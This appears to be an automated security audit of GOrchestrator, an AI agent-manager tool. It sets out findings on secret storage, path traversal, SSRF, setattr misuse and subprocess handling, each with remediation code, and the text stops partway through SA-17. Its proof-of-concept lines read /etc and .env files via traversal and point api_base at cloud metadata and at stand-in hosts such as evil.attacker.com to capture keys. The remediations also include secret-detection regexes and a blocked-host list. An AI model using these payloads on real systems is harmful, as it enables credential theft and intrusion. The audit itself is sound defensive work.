# GOrchestrator Security Audit Report

**Audit Date:** 2026-02-23
**Auditor:** Antigravity Security Audit Engine (Claude Opus 4.6)
**Scope:** Full source code audit of GOrchestrator AI Agent Manager
**Classification:** CONFIDENTIAL

---

## Executive Summary

This audit examined the GOrchestrator codebase, an AI Agent Manager that orchestrates LLM-powered coding agents. The application handles sensitive API keys, spawns subprocesses, persists state in JSON files, reads/writes `.env` configuration, and executes Git operations. The audit uncovered **4 Critical**, **6 High**, **7 Medium**, and **5 Low** severity findings across secret management, file system security, input validation, subprocess handling, and resource management.

The most severe risks involve plaintext API key storage in unprotected JSON registry files, a `.env` value corruption bug that can silently destroy API keys containing `#`, path traversal via profile names, and unrestricted attribute mutation through `setattr`. None of the findings enable remote code execution in the default configuration, but several create preconditions for credential theft and data corruption that an attacker with local file access or the ability to craft registry files could exploit.

---

## Findings Summary

| ID | Severity | Category | Title | CWE |
|------|----------|---------------------|-----------------------------------------------|---------|
| SA-01 | Critical | Secret Management | Plaintext API keys in JSON registry files | CWE-312 |
| SA-02 | Critical | Data Integrity | `write_env_value()` corrupts values containing `#` | CWE-20 |
| SA-03 | Critical | Path Traversal | Profile name path traversal across 4 vectors | CWE-22 |
| SA-04 | Critical | Secret Management | API keys leaked into session history files | CWE-532 |
| SA-05 | High | Secret Management | Temporary `.env.tmp` created without restrictive permissions | CWE-732 |
| SA-06 | High | Input Validation | `LLMPool.update()` uses unconstrained `setattr` | CWE-915 |
| SA-07 | High | Provider Security | Fragile keyword-based provider detection misroutes keys | CWE-345 |
| SA-08 | High | Secret Management | LiteLLM exceptions may include API keys in error text | CWE-209 |
| SA-09 | High | Input Validation | No validation on `api_base` URL allows SSRF-adjacent attacks | CWE-918 |
| SA-10 | High | Deserialization | JSON registry files loaded without schema validation | CWE-502 |
| SA-11 | Medium | Resource Management | ThreadPoolExecutor instances never shut down | CWE-404 |
| SA-12 | Medium | Code Quality | `sys.path.insert` hack in `main.py` | CWE-426 |
| SA-13 | Medium | Concurrency | Registry files read/written without file locking | CWE-362 |
| SA-14 | Medium | Configuration | Debug traceback printed to console on fatal error | CWE-209 |
| SA-15 | Medium | Input Validation | Dual command systems may allow access control bypass | CWE-284 |
| SA-16 | Medium | Secret Management | PYTHONPATH in subprocess env allowlist | CWE-427 |
| SA-17 | Medium | Input Validation | Argument injection via `--task` parameter | CWE-88 |
| SA-18 | Low | Configuration | Dummy API keys in default settings | CWE-1188 |
| SA-19 | Low | Dependency | Unpinned dependency versions | CWE-1104 |
| SA-20 | Low | Logging | Full filesystem paths exposed in error messages | CWE-209 |
| SA-21 | Low | Configuration | `lru_cache` on settings prevents environment changes | CWE-1176 |
| SA-22 | Low | Input Validation | No length limits on user message content | CWE-770 |

---

## Detailed Findings

---

### SA-01: Plaintext API Keys in JSON Registry Files
**Severity:** CRITICAL
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
**CVSS 3.1:** 7.5 (High)

**Location:**
- `src/core/engine.py` lines 132-149 (`WorkerRegistry._save()`)
- `src/core/sub_manager.py` lines 76-100 (`SubManagerRegistry._save()`)
- `src/core/llm_pool.py` lines 98-105 (`LLMPool._save()`)

**Description:**
API keys for all workers, sub-managers, and LLM pool entries are stored in plaintext JSON files within the `.gorchestrator/` directory. These files (`workers.json`, `sub_managers.json`, `manager_llms.json`) contain sensitive credentials with no encryption, no file permission restrictions, and no access controls.

**Proof of Concept:**
```bash
# After a user runs: /worker add coder gpt-4 live
# Then sets the API key: /worker set coder api https://api.openai.com sk-proj-REAL_KEY_HERE
cat .gorchestrator/workers.json
```
Output:
```json
{
  "default": { "name": "default", "model": "claude-3-5-sonnet", "profile": "livesweagent", "active": true },
  "coder": { "name": "coder", "model": "gpt-4", "profile": "live", "active": false,
             "api_base": "https://api.openai.com", "api_key": "sk-proj-REAL_KEY_HERE" }
}
```

**Impact:** Any user or process with read access to the project directory can harvest all stored API keys. On shared systems, CI/CD environments, or if the project is accidentally committed without proper `.gitignore`, all credentials are exposed.

**Mitigating Factor:** `.gorchestrator/` is in `.gitignore` (line 48), so these files are not committed to version control by default. However, the files have default filesystem permissions.

**Remediation:**
```python
# Option 1: Encrypt at rest using a machine-specific key
import os
import base64
from cryptography.fernet import Fernet

def _get_or_create_key(key_file: Path) -> bytes:
    """Get or create a machine-local encryption key."""
    if key_file.exists():
        return key_file.read_bytes()
    key = Fernet.generate_key()
    key_file.write_bytes(key)
    os.chmod(str(key_file), 0o600)  # Owner-only read/write
    return key

def _encrypt_key(api_key: str, fernet: Fernet) -> str:
    return "ENC:" + base64.urlsafe_b64encode(
        fernet.encrypt(api_key.encode())
    ).decode()

def _decrypt_key(stored: str, fernet: Fernet) -> str:
    if stored.startswith("ENC:"):
        return fernet.decrypt(
            base64.urlsafe_b64decode(stored[4:])
        ).decode()
    return stored  # Backward compat for unencrypted keys

# Option 2: Restrict file permissions on save
def _save(self):
    self._file.parent.mkdir(parents=True, exist_ok=True)
    # ... write data ...
    with open(self._file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    # Restrict permissions to owner only
    if os.name != "nt":
        os.chmod(str(self._file), 0o600)

# Option 3: Use OS keyring (most secure)
import keyring
keyring.set_password("gorchestrator", f"worker_{name}_api_key", api_key)
```

---

### SA-02: `write_env_value()` Corrupts Values Containing `#`
**Severity:** CRITICAL
**CWE:** CWE-20 (Improper Input Validation)
**CVSS 3.1:** 7.4 (High)

**Location:** `src/core/config.py` lines 461-476

**Description:**
The `write_env_value()` function splits each `.env` line on `#` to separate "value" from "inline comment." This logic is fundamentally broken when existing values contain `#` characters, which is common in API keys (e.g., Azure OpenAI keys, base64-encoded tokens). The function will:

1. Misidentify the portion after `#` in the value as a comment
2. Append this "comment" to the new value being written
3. Silently corrupt the `.env` file

**Proof of Concept:**
```python
# Existing .env line: PROXY_KEY=sk-abc#xyz123
# User runs: /config set PROXY_KEY new-key-value

# What write_env_value() does:
line = "PROXY_KEY=sk-abc#xyz123"
part_before_comment = line.split("#")[0].strip()  # "PROXY_KEY=sk-abc"
# Match found because "PROXY_KEY=sk-abc".startswith("PROXY_KEY=")
idx = line.index("#")  # idx = 16
comment = "  " + line[16:]  # "  #xyz123"
# Result: "PROXY_KEY=new-key-value  #xyz123"
# When read back by pydantic-settings: value = "new-key-value" (truncated at #)
```

**Impact:** Silent credential corruption. The user believes they updated the key, but the stored value is corrupted with a stale comment fragment. Subsequent reads parse the value as truncated at `#`. This could cause authentication failures with no clear cause, or worse, send truncated keys to API endpoints.

**Remediation:**
```python
def write_env_value(key: str, value: str):
    """Update a KEY=value line in the .env file. Adds if not found."""
    ALLOWED_KEYS = {
        "ORCHESTRATOR_MODEL", "ORCHESTRATOR_API_BASE", "ORCHESTRATOR_API_KEY",
        "WORKER_MODEL", "WORKER_PROFILE", "MANAGER_PROFILE",
        "PROXY_URL", "PROXY_KEY", "AGENT_PATH",
        "VERBOSE_WORKER", "MAX_WORKER_ITERATIONS", "WORKER_TIMEOUT",
    }
    if key not in ALLOWED_KEYS:
        raise ValueError(f"Unknown config key: {key}")
    value = value.replace("\n", "").replace("\r", "")

    if not _ENV_FILE.exists():
        _ENV_FILE.write_text(f"{key}={value}\n", encoding="utf-8")
        return

    lines = _ENV_FILE.read_text(encoding="utf-8").splitlines()
    found = False
    # Match pattern: KEY= at the start of line, ignoring pure comment lines
    key_pattern = re.compile(rf"^{re.escape(key)}=")
    for i, line in enumerate(lines):
        stripped = line.strip()
        if stripped.startswith("#"):
            continue
        if key_pattern.match(stripped):
            # Replace the entire line - do NOT attempt to preserve inline comments
            # Inline comments in .env values are an ambiguous antipattern
            lines[i] = f"{key}={value}"
            found = True
            break
    if not found:
        lines.append(f"{key}={value}")

    tmp_path = _ENV_FILE.with_suffix(".tmp")
    tmp_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    import os
    os.replace(str(tmp_path), str(_ENV_FILE))
```

---

### SA-03: Profile Name Path Traversal Across 4 Vectors
**Severity:** CRITICAL
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
**CVSS 3.1:** 7.2 (High)

**Location:**
1. `src/core/config.py` line 282 - `MANAGER_PROFILE` in `get_manager_config()`
2. `src/core/config.py` lines 289-290 - `rules_file` in `get_manager_config()`
3. `src/core/manager.py` line 597 - sub-manager `profile` in `_execute_single_consult()`
4. `src/commands/handlers.py` line 93 - User-supplied profile name passed unsanitized

**Description:**
Profile names are used to construct file paths without path traversal validation. An attacker who can control profile names (via slash commands, registry files, or environment variables) can read arbitrary YAML files on the filesystem.

**Proof of Concept:**
```
# Vector 1: Manager profile traversal via command
/manager set profile ../../../../etc/hostname
# Constructs: PROJECT_ROOT/src/core/manager_profiles/../../../../etc/hostname.yaml
# Resolves to: /etc/hostname.yaml (if exists, loaded and parsed as YAML)

# Vector 2: Rules file traversal via crafted YAML profile
# In a manager profile YAML: rules_file: ../../../.env
# Constructs: PROJECT_ROOT/src/core/manager_profiles/../../../.env
# Resolves to reading .env as YAML (leaks all environment config)

# Vector 3: Sub-manager profile traversal via registry
# Craft sub_managers.json with: "profile": "../../.env"
# When consulted, constructs: sub_manager_profiles/../../.env.yaml
```

**Impact:** Arbitrary file read on the local filesystem (limited to files that can be parsed as YAML without throwing an exception). Could expose `.env` files, configuration files, or other sensitive data. Since `yaml.safe_load` is used, code execution via YAML deserialization is not possible, but data exfiltration is.

**Remediation:**
```python
import os

def validate_profile_name(name: str, context: str = "profile") -> str:
    """Validate that a profile name is safe (no path traversal)."""
    # Reject path separators and traversal sequences
    if any(c in name for c in ('/', '\\', '..', '\x00')):
        raise ValueError(
            f"Invalid {context} name '{name}': must not contain path separators"
        )
    # Sanitize to safe characters
    safe = SANITIZE_RE.sub("-", name)
    if not safe:
        raise ValueError(f"Invalid {context} name: empty after sanitization")
    return safe

# Apply in get_manager_config():
def get_manager_config(self) -> dict[str, Any]:
    if self.MANAGER_PROFILE:
        safe_profile = validate_profile_name(self.MANAGER_PROFILE, "manager profile")
        profile_path = _PROJECT_ROOT / "src/core/manager_profiles" / f"{safe_profile}.yaml"
        # ...
        # Also validate rules_file:
        if config.get("rules_file"):
            safe_rules = validate_profile_name(config["rules_file"], "rules file")
            rules_path = _PROJECT_ROOT / "src/core/manager_profiles" / safe_rules
            # Additionally verify the resolved path is under the profiles directory:
            resolved = rules_path.resolve()
            allowed_dir = (_PROJECT_ROOT / "src/core/manager_profiles").resolve()
            if not str(resolved).startswith(str(allowed_dir)):
                raise ValueError(f"Rules file path escapes profiles directory")

# Apply the same validation in handlers.py _manager_set_profile():
def _manager_set_profile(self, args: list[str]) -> bool:
    if len(args) < 1:
        self.engine.ui.print_error("Usage: /manager set profile <name>")
        return False
    from ..core.config import validate_profile_name
    try:
        profile_name = validate_profile_name(args[0])
    except ValueError as e:
        self.engine.ui.print_error(str(e))
        return False
    return self.engine._manager_set_profile(profile_name)
```

---

### SA-04: API Keys Leaked into Session History Files
**Severity:** CRITICAL
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)
**CVSS 3.1:** 7.0 (High)

**Location:**
- `src/core/manager.py` lines 1064-1076 (`export_history()`)
- `src/core/engine.py` lines 457-498 (`save_session()`)

**Description:**
Session history is exported with full, unredacted message content. When the Manager LLM makes tool calls to `delegate_to_*` workers, the tool call arguments and tool responses are stored in the conversation history. If a user sets API credentials via commands and the LLM references them, or if worker output contains API keys from error messages, these keys are persisted in plaintext `session.json` files.

Additionally, `export_history()` includes `tool_calls` data which may contain API base URLs and context from commands like `/worker set api <base> <key>`, and the full worker output (last 50 lines) which may include LiteLLM error messages containing API keys.

**Proof of Concept:**
```python
# Worker output may contain LiteLLM error like:
# "AuthenticationError: Invalid API Key provided: sk-proj-abc...xyz"
# This gets stored in the tool response message and persisted to session.json

# session.json excerpt after saving:
{
  "manager_history": [
    {
      "role": "tool",
      "content": "Worker Agent Result:\nStatus: FAILED\nError: AuthenticationError: Incorrect API key provided: sk-proj-FULL_KEY_HERE...",
      "tool_call_id": "call_abc123"
    }
  ]
}
```

**Impact:** All session files in `.gorchestrator/sessions/` may contain API keys. Session files are persistent across application restarts and could accumulate keys over time.

**Remediation:**
```python
import re

_API_KEY_PATTERN = re.compile(
    r'(sk-[a-zA-Z0-9_-]{10,}|'           # OpenAI/Anthropic style
    r'AIza[a-zA-Z0-9_-]{30,}|'           # Google API keys
    r'key-[a-zA-Z0-9]{20,}|'             # Generic key pattern
    r'(?:api[_-]?key|secret|token|password)\s*[=:]\s*\S+)',  # Key-value patterns
    re.IGNORECASE
)

def _redact_secrets(text: str) -> str:
    """Redact potential API keys from text before persistence."""
    return _API_KEY_PATTERN.sub("[REDACTED]", text)

# Apply in export_history():
def export_history(self) -> list[dict]:
    """Export conversation history for persistence with secrets redacted."""
    return [
        {
            "role": msg.role.value,
            "content": _redact_secrets(msg.content),
            "timestamp": msg.timestamp,
            "tool_calls": msg.tool_calls,  # Tool call args are structured, less risky
            "tool_call_id": msg.tool_call_id,
            "name": msg.name,
        }
        for msg in self.messages
    ]
```

---

### SA-05: Temporary `.env.tmp` Created Without Restrictive Permissions
**Severity:** HIGH
**CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)
**CVSS 3.1:** 5.5 (Medium)

**Location:** `src/core/config.py` lines 479-482

**Description:**
When `write_env_value()` updates the `.env` file, it first writes the content to `.env.tmp` using Python's default file creation permissions (typically `0o644` on Unix, inheriting from umask). On multi-user systems, this temporary file containing all `.env` variables (including API keys) is readable by other users for the brief period it exists.

```python
tmp_path = _ENV_FILE.with_suffix(".tmp")
tmp_path.write_text("\n".join(lines) + "\n", encoding="utf-8")  # Default perms
import os
os.replace(str(tmp_path), str(_ENV_FILE))
```

**Impact:** Race condition window where API keys are readable by other users on multi-user Linux/macOS systems.

**Remediation:**
```python
import os
import stat
import tempfile

# Option 1: Use os.open with restrictive permissions
fd = os.open(str(tmp_path), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
try:
    os.write(fd, ("\n".join(lines) + "\n").encode("utf-8"))
finally:
    os.close(fd)
os.replace(str(tmp_path), str(_ENV_FILE))

# Option 2: Use tempfile in the same directory
with tempfile.NamedTemporaryFile(
    mode="w", dir=str(_ENV_FILE.parent), suffix=".tmp",
    delete=False, encoding="utf-8"
) as f:
    f.write("\n".join(lines) + "\n")
    tmp_name = f.name
os.replace(tmp_name, str(_ENV_FILE))
```

---

### SA-06: `LLMPool.update()` Uses Unconstrained `setattr`
**Severity:** HIGH
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
**CVSS 3.1:** 6.2 (Medium)

**Location:** `src/core/llm_pool.py` lines 161-170

**Description:**
The `update()` method accepts arbitrary `**kwargs` and uses `setattr` to modify attributes on `LLMConfig` objects. While the `hasattr` check limits this to existing attributes, Python dataclass instances also have dunder attributes (`__class__`, `__dict__`, `__dataclass_fields__`). An attacker who can control the kwargs (via crafted commands or registry manipulation) could modify internal Python object attributes.

```python
def update(self, name: str, **kwargs) -> bool:
    cfg = self._llms.get(name)
    if not cfg:
        return False
    for key, value in kwargs.items():
        if hasattr(cfg, key):          # Passes for __class__, __dict__, etc.
            setattr(cfg, key, value)    # Unconstrained attribute mutation
    self._save()
    return True
```

**Proof of Concept:**
```python
# If an attacker can invoke update() with crafted kwargs:
pool.update("my-llm", __class__=MaliciousClass)
# Or less dramatically:
pool.update("my-llm", name="'; DROP TABLE--")  # Changes the internal name
```

**Impact:** Potential object corruption, attribute injection. In practice, the attack surface is limited since `update()` is called from command handlers with partially controlled kwargs. However, the pattern violates the principle of least privilege.

**Remediation:**
```python
_MUTABLE_FIELDS = frozenset({"model", "api_base", "api_key", "temperature", "max_tokens"})

def update(self, name: str, **kwargs) -> bool:
    """Update an LLM's settings. Only whitelisted fields are modifiable."""
    cfg = self._llms.get(name)
    if not cfg:
        return False
    for key, value in kwargs.items():
        if key not in self._MUTABLE_FIELDS:
            logger.warning(f"Rejected update of non-mutable field '{key}'")
            continue
        setattr(cfg, key, value)
    self._save()
    return True
```

---

### SA-07: Fragile Keyword-Based Provider Detection Misroutes API Keys
**Severity:** HIGH
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)
**CVSS 3.1:** 6.5 (Medium)

**Location:** `src/core/config.py` lines 108-124

**Description:**
The `detect_provider()` function uses simple keyword matching to determine which LLM provider to route API calls to. This creates risk of sending API keys to the wrong provider endpoint, potentially exposing credentials to unauthorized third parties.

```python
_ANTHROPIC_KEYWORDS = ("claude", "opus", "sonnet", "haiku")
_GOOGLE_KEYWORDS = ("gemini", "palm")

def detect_provider(model_name: str) -> str:
    # ...
    name = model_name.lower()
    if any(k in name for k in _ANTHROPIC_KEYWORDS):  # "opus" matches "my-opus-model"
        return "anthropic"
    if any(k in name for k in _GOOGLE_KEYWORDS):
        return "google"
    return "openai"
```

**Proof of Concept:**
```python
# "opus" is an Anthropic keyword, but these are NOT Anthropic models:
detect_provider("my-custom-opus-finetune")      # Returns "anthropic" (WRONG)
detect_provider("haiku-generator-v2")            # Returns "anthropic" (WRONG)
detect_provider("palm-beach-local-model")        # Returns "google" (WRONG)

# The Anthropic API key gets sent to the wrong api_base endpoint
```

**Impact:** API keys intended for one provider could be sent to another provider's endpoint (or a local proxy configured for a different provider). If the `api_base` is a third-party endpoint, credentials are exposed.

**Remediation:**
```python
_ANTHROPIC_PATTERNS = re.compile(
    r'^(claude-|anthropic/)', re.IGNORECASE
)
_GOOGLE_PATTERNS = re.compile(
    r'^(gemini-|google/|vertex_ai/|palm-)', re.IGNORECASE
)

def detect_provider(model_name: str) -> str:
    """Detect provider from model name using strict prefix matching."""
    if "/" in model_name:
        provider = model_name.split("/", 1)[0].lower()
        if provider in ("anthropic", "openai", "google", "vertex_ai"):
            return provider
    if _ANTHROPIC_PATTERNS.match(model_name):
        return "anthropic"
    if _GOOGLE_PATTERNS.match(model_name):
        return "google"
    return "openai"
```

---

### SA-08: LiteLLM Exceptions May Expose API Keys in Error Messages
**Severity:** HIGH
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
**CVSS 3.1:** 5.3 (Medium)

**Location:**
- `src/core/manager.py` line 550: `logger.error(f"LLM call failed ({provider}/{model_name}): {e}")`
- `src/core/sub_manager.py` line 324: `logger.error(f"Sub-manager '{config.name}' consultation failed: {e}")`
- `src/core/llm_pool.py` line 255: `logger.error(f"Parallel LLM '{cfg.name}' call failed: {e}")`

**Description:**
LiteLLM and the underlying HTTP libraries (httpx, requests) may include API keys in exception messages, particularly for authentication failures. These exceptions are logged to `gorchestrator.log` and in some cases surfaced to the user via tool response messages that enter conversation history.

**Example exception text from LiteLLM:**
```
litellm.exceptions.AuthenticationError: OpenAIException - Incorrect API key
provided: sk-proj-abc...xyz. You can find your API key at ...
```

**Remediation:**
```python
def _sanitize_exception(e: Exception) -> str:
    """Remove potential API keys from exception messages."""
    msg = str(e)
    # Redact anything that looks like an API key
    msg = re.sub(r'sk-[a-zA-Z0-9_-]{10,}', 'sk-[REDACTED]', msg)
    msg = re.sub(r'key-[a-zA-Z0-9]{10,}', 'key-[REDACTED]', msg)
    msg = re.sub(r'AIza[a-zA-Z0-9_-]{30,}', 'AIza[REDACTED]', msg)
    return msg

# Usage:
except Exception as e:
    safe_msg = _sanitize_exception(e)
    logger.error(f"LLM call failed ({provider}/{model_name}): {safe_msg}")
    raise
```

---

### SA-09: No Validation on `api_base` URL Allows SSRF-Adjacent Attacks
**Severity:** HIGH
**CWE:** CWE-918 (Server-Side Request Forgery)
**CVSS 3.1:** 5.5 (Medium)

**Location:**
- `src/commands/handlers.py` lines 106-115 (`_manager_set_api()`)
- `src/core/engine.py` line 238 (`WorkerRegistry.update_api()`)
- `src/core/sub_manager.py` line 168 (`SubManagerRegistry.update_api()`)

**Description:**
The `api_base` URL is accepted from user input and passed directly to LiteLLM without validation. A user (or attacker with command access) can set `api_base` to internal network addresses, metadata endpoints, or file URIs.

**Proof of Concept:**
```
# Exfiltrate cloud metadata credentials:
/manager set api http://169.254.169.254/latest/meta-data/iam/

# Target internal services:
/worker set coder api http://localhost:9200  # Elasticsearch
/worker set coder api http://internal-admin.corp:8080

# Exfiltrate data to attacker server (API key sent as Authorization header):
/manager set api https://evil.attacker.com/capture
```

**Impact:** API keys are sent as `Authorization: Bearer <key>` headers to the specified `api_base`. An attacker who can set this value can exfiltrate credentials to any HTTP endpoint they control.

**Remediation:**
```python
from urllib.parse import urlparse

_BLOCKED_HOSTS = {"169.254.169.254", "metadata.google.internal", "100.100.100.200"}
_ALLOWED_SCHEMES = {"http", "https"}

def validate_api_base(url: str) -> str:
    """Validate api_base URL to prevent SSRF attacks."""
    parsed = urlparse(url)
    if parsed.scheme not in _ALLOWED_SCHEMES:
        raise ValueError(f"Invalid URL scheme: {parsed.scheme}. Must be http or https.")
    if not parsed.hostname:
        raise ValueError("URL must have a hostname")
    if parsed.hostname in _BLOCKED_HOSTS:
        raise ValueError(f"Blocked hostname: {parsed.hostname}")
    # Block link-local and metadata IPs
    import ipaddress
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_link_local or ip.is_loopback:
            logger.warning(f"api_base points to local/link-local address: {parsed.hostname}")
    except ValueError:
        pass  # Hostname, not IP - OK
    return url
```

---

### SA-10: JSON Registry Files Loaded Without Schema Validation
**Severity:** HIGH
**CWE:** CWE-502 (Deserialization of Untrusted Data)
**CVSS 3.1:** 5.0 (Medium)

**Location:**
- `src/core/engine.py` lines 119-130 (`WorkerRegistry._load()`)
- `src/core/sub_manager.py` lines 63-74 (`SubManagerRegistry._load()`)
- `src/core/llm_pool.py` lines 76-96 (`LLMPool._load()`)

**Description:**
Registry files are loaded from disk and deserialized using `json.load()` followed by `**entry` unpacking into dataclass constructors. While Python dataclasses reject unexpected keyword arguments (providing some safety), the loaded data is not validated against a schema. This means:

1. Missing required fields cause cryptic `TypeError` exceptions instead of clear validation errors
2. The `parallel_llms` field in `SubManagerConfig` accepts `list[dict] | None`, meaning any nested dict structure is accepted without validation
3. Type coercion is not enforced (e.g., a string where an int is expected)

**Proof of Concept:**
```json
// Crafted sub_managers.json:
{
  "evil": {
    "name": "evil",
    "profile": "../../.env",
    "model": "gpt-4",
    "active": true,
    "parallel_llms": [
      {"name": "exfil", "model": "gpt-4", "api_base": "https://evil.com/steal",
       "api_key": "doesnt-matter",
       "__proto__": {"polluted": true},
       "extra_nested": {"arbitrary": "data"}}
    ]
  }
}
```

**Remediation:**
```python
from pydantic import BaseModel, validator

class WorkerConfigSchema(BaseModel):
    name: str
    model: str
    profile: str
    active: bool = False
    api_base: str | None = None
    api_key: str | None = None

    @validator("name")
    def validate_name(cls, v):
        if not re.match(r'^[a-zA-Z0-9_-]+$', v):
            raise ValueError(f"Invalid name: {v}")
        return v

# In _load():
def _load(self):
    if self._file.exists():
        try:
            with open(self._file, "r", encoding="utf-8") as f:
                data = json.load(f)
            self._workers = {}
            for name, entry in data.items():
                validated = WorkerConfigSchema(**entry)
                self._workers[name] = WorkerConfig(**validated.dict())
        except (json.JSONDecodeError, ValidationError) as e:
            logger.error(f"Registry validation failed: {e}")
            self._workers = {}
```

---

### SA-11: ThreadPoolExecutor Instances Never Shut Down
**Severity:** MEDIUM
**CWE:** CWE-404 (Improper Resource Shutdown or Release)
**CVSS 3.1:** 3.7 (Low)

**Location:**
- `src/core/manager.py` line 305: `self._executor = ThreadPoolExecutor(max_workers=8)`
- `src/core/sub_manager.py` line 252: `self._executor = ThreadPoolExecutor(max_workers=8)`
- `src/core/llm_pool.py` line 64: `self._executor = ThreadPoolExecutor(max_workers=8)`

**Description:**
Three separate `ThreadPoolExecutor` instances are created, each with 8 max workers (24 threads total), but none implement `__del__`, context manager protocol, or explicit `shutdown()`. Threads accumulate and are never cleaned up. On long-running sessions or if the application crashes, these threads leak.

**Remediation:**
```python
class ManagerAgent:
    def __init__(self, ...):
        self._executor = ThreadPoolExecutor(max_workers=8)

    def shutdown(self):
        """Clean up resources."""
        self._executor.shutdown(wait=False, cancel_futures=True)

    def __del__(self):
        self.shutdown()

# Or use atexit in SessionEngine:
import atexit

class SessionEngine:
    def __init__(self, ...):
        # ...
        atexit.register(self._cleanup)

    def _cleanup(self):
        if self.manager:
            self.manager.shutdown()
```

---

### SA-12: `sys.path.insert` Hack in `main.py`
**Severity:** MEDIUM
**CWE:** CWE-426 (Untrusted Search Path)
**CVSS 3.1:** 4.4 (Medium)

**Location:** `main.py` line 46

**Description:**
```python
sys.path.insert(0, str(Path(__file__).parent / "src"))
```
This inserts the `src/` directory at position 0 of `sys.path`, giving it priority over all system packages. If an attacker can write files to the `src/` directory (e.g., a file named `json.py`, `os.py`, or `logging.py`), they can hijack standard library imports for the entire application.

**Remediation:**
```python
# Remove sys.path.insert and fix imports to use proper package structure.
# If needed, use: sys.path.append() (lower priority) instead of insert(0, ...)
# Or configure pyproject.toml packages correctly so that the project is installable.
```

---

### SA-13: Registry Files Read/Written Without File Locking
**Severity:** MEDIUM
**CWE:** CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization)
**CVSS 3.1:** 3.7 (Low)

**Location:** All `_save()` and `_load()` methods in `engine.py`, `sub_manager.py`, `llm_pool.py`

**Description:**
Registry JSON files are read and written without any file locking mechanism. If multiple GOrchestrator instances or concurrent operations access the same registry file, data corruption can occur (partial writes, lost updates, or invalid JSON).

**Remediation:**
```python
import fcntl  # Unix
# Or use: from filelock import FileLock  (cross-platform)

def _save(self):
    self._file.parent.mkdir(parents=True, exist_ok=True)
    lock_file = self._file.with_suffix(".lock")
    with open(lock_file, "w") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX)
        try:
            data = self.to_dict_list()
            with open(self._file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        finally:
            fcntl.flock(lock, fcntl.LOCK_UN)
```

---

### SA-14: Debug Traceback Printed to Console on Fatal Error
**Severity:** MEDIUM
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
**CVSS 3.1:** 3.3 (Low)

**Location:** `main.py` lines 79-83

**Description:**
```python
except Exception as e:
    print(f"Fatal error: {e}")
    import traceback
    traceback.print_exc()
    return 1
```
Full Python tracebacks are printed to the console on unhandled exceptions. These tracebacks can expose internal file paths, configuration values, and potentially API keys that appear in local variables of stack frames.

**Remediation:**
```python
except Exception as e:
    print(f"Fatal error: An unexpected error occurred. Check gorchestrator.log for details.")
    logger.exception(f"Fatal error: {e}")
    return 1
```

---

### SA-15: Dual Command Systems May Allow Access Control Bypass
**Severity:** MEDIUM
**CWE:** CWE-284 (Improper Access Control)
**CVSS 3.1:** 4.3 (Medium)

**Location:**
- `src/commands/handlers.py` - New command system
- `src/core/engine.py` - Legacy `_handle_slash_command()` system

**Description:**
Two parallel command dispatch systems exist. The new `CommandParser`/`CommandHandler` system in `src/commands/` delegates to the legacy `engine._handle_slash_command()` and `engine._handle_*_command()` methods. This dual-path architecture means security checks (if added to one system) might not be enforced in the other. Commands like `/session load`, `/session save`, and `/session export` have parallel code paths that could diverge in behavior.

Specific example in `handlers.py` lines 248-253:
```python
elif action.startswith("save"):
    return self._session_save(cmd.args)
```
The `startswith("save")` check means `"savefile"` or `"save_all"` would also match, potentially triggering unintended behavior.

**Remediation:** Consolidate to a single command dispatch path with explicit action matching (`==` not `startswith`), and add centralized authorization checks before dispatching.

---

### SA-16: PYTHONPATH in Subprocess Env Allowlist
**Severity:** MEDIUM
**CWE:** CWE-427 (Uncontrolled Search Path Element)
**CVSS 3.1:** 4.0 (Medium)

**Location:** `src/core/worker.py` line 118

**Description:**
```python
_ENV_ALLOWLIST = {
    "PATH", "HOME", "USERPROFILE", "SYSTEMROOT", "COMSPEC",
    "TEMP", "TMP", "TMPDIR", "LANG", "LC_ALL", "LC_CTYPE",
    "PYTHONPATH", "VIRTUAL_ENV", "UV_CACHE_DIR",
    ...
}
```
`PYTHONPATH` is passed through to the worker subprocess. If an attacker can control the `PYTHONPATH` environment variable of the parent process, they can inject malicious Python modules that the worker subprocess will import. The allowlist is otherwise well-designed (good security practice), but `PYTHONPATH` undermines it.

**Remediation:**
```python
# Remove PYTHONPATH from the allowlist unless specifically required
_ENV_ALLOWLIST = {
    "PATH", "HOME", "USERPROFILE", "SYSTEMROOT", "COMSPEC",
    "TEMP", "TMP", "TMPDIR", "LANG", "LC_ALL", "LC_CTYPE",
    "VIRTUAL_ENV", "UV_CACHE_DIR",  # PYTHONPATH removed
    "TERM", "COLORTERM", "FORCE_COLOR",
}
```

---

### SA-17: Argument Injection via `--task` Parameter
**Severity:** MEDIUM
**CWE:** CWE-88 (Improper Neutralization of Argument Delimiters in a Command)
**CVSS 3.1:** 4.0 (Medium)

**Location:** `src/core/worker.py` lines 88-112

**Description:**
The `_build_command()` method passes user-controlled task content as a positional argument to the `mini` CLI tool. While `subprocess.Popen` is called with a list (not `shell=True`), preventing shell injection, the task content can begin with `--` which could be interpreted as CLI flags by the `mini` tool.

```python
def _build_command(self, task: str, model: str, profile: str | None = None) -> list[str]:
    return [
        "uv", "run", "mini", "--headless",
        "--profile", profile,    # User-controlled profile name
        "--model", model,        # User-controlled model name
        "--task", task,           # LLM-generated task description
    ]
```

If the `mini` CLI uses a permissive argument parser, a task like `--config /etc/passwd --task real_task` could inject additional arguments.

**Mitigating Factor:** The task is generated by the Manager LLM, not directly by the user. An attacker would need to craft a prompt injection attack against the Manager LLM to control the task content.

**Remediation:**
```python
def _build_command(self, task: str, model: str, profile: str | None = None) -> list[str]:
    profile = profile or self.settings.WORKER_PROFILE
    cmd = [
        "uv", "run", "mini", "--headless",
        "--profile", profile,
        "--model", model,
        "--task",
    ]
    # Prevent argument injection by ensuring task doesn't start with --
    safe_task = task.lstrip("-") if task.startswith("-") else task
